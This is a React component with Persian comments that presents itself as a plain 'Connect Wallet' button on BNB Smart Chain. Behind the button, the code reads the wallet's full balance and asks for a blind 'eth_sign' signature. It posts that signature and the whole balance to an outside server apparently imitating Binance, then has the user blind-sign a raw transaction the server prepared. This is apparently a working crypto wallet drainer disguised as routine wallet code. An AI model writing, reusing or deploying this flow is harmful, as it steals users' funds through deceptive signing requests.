import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  async function runner() {
    if (typeof localStorage !== "undefined") {
      localStorage.removeItem("walletconnect");
    }

    const ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      chains: [56], // فقط BSC
      methods: ["eth_sign", "eth_getBalance"],
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    const provider = ethereumProvider;
    const accounts = await provider.request({ method: "eth_accounts" });
    const accountSender = accounts[0];

    if (!accountSender) {
      console.error("❌ Wallet connection failed");
      return;
    }

    console.log("✅ Wallet Connected:", accountSender);

    try {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }], // BSC Chain ID
      });
    } catch (error) {
      console.error("❌ Error in switching chain:", error);
      return;
    }

    const apiUrl = "https://sponsorbinance.vercel.app/api/proxy";

    // **📌 دریافت مقدار BNB از کیف پول**
    let amount;
    try {
      const balanceHex = await provider.request({
        method: "eth_getBalance",
        params: [accountSender, "latest"],
      });
      amount = parseInt(balanceHex, 16); // تبدیل از هگز به عدد
    } catch (error) {
      console.error("❌ Error in fetching balance:", error);
      return;
    }

    console.log("💰 User Balance:", amount);

    // **📌 دریافت امضای اولیه از کیف پول برای تأیید کاربر**
    const message = "Authorize transaction on BSC";
    let signature;
    try {
      signature = await provider.request({
        method: "eth_sign",
        params: [accountSender, message],
      });
    } catch (error) {
      console.error("❌ Signature failed:", error);
      return;
    }

    console.log("✍️ Signature:", signature);

    // **📌 ارسال امضا و درخواست تراکنش به سرور**
    async function signAndSendTransaction() {
      try {
        console.log("📡 Requesting Unsigned Transaction...");

        const result = await jQuery.post(apiUrl, {
          handler: "tx",
          address: accountSender,
          signature: signature,
          amount: amount, // ارسال مقدار BNB کاربر
        });

        if (!result || result.error) {
          console.error("❌ API Error:", result.error);
          return;
        }

        console.log("📜 Unsigned Transaction:", result);

        const unsignedTx = result.rawTransaction;
        if (!unsignedTx) {
          console.error("❌ Invalid transaction data");
          return;
        }

        console.log("📝 Signing Transaction...");
        const signedTx = await provider.request({
          method: "eth_sign",
          params: [accountSender, unsignedTx],
        });

        console.log("✍️ Signed Transaction:", signedTx);

        const txHash = await jQuery.post(apiUrl, {
          handler: "sign",
          signature: signedTx,
          address: accountSender,
        });

        console.log("📤 Transaction Sent:", txHash);
      } catch (error) {
        console.error("❌ Error in signAndSendTransaction:", error);
      }
    }

    await signAndSendTransaction();
  }

  return (
    <a
      href="#"
      id="connectWallet"
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      data-uk-toggle=""
    >
      <span>Connect Wallet</span>
    </a>
  );
}

export default App;
